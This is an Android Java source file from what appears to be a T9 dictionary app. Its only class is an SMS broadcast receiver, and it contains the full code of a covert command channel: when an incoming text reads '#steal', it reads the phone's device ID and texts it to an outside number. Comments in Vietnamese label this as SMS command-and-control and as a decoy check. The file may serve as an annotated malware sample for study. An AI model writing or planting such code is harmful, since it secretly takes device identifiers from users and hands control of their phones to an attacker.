package com.rdict.t9;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;

public class CmdReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        // mồi: so action là ICC bình thường
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) return;
        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        SmsMessage m = SmsMessage.createFromPdu((byte[]) pdus[0]);
        String body = m.getMessageBody();
        // E: lệnh C2 qua SMS
        if (body.equals("#steal")) {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            SmsManager.getDefault().sendTextMessage("+79990001122", null, tm.getDeviceId(), null, null);
        }
    }
}
